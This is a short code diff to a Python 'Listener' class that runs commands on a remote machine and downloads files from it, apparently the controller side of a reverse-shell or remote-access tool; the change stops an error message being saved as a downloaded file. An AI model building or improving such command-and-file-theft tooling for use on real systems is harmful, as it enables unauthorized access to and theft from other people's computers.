@@ -64,7 +64,7 @@ class Listener:
 
             result = self.execute_remote_command(command)
 
-            if command[0] == "download":
+            if command[0] == "download" and "[-] Error" not in result:
                 result = self.write_file(command[1], result)
 
             print(result)
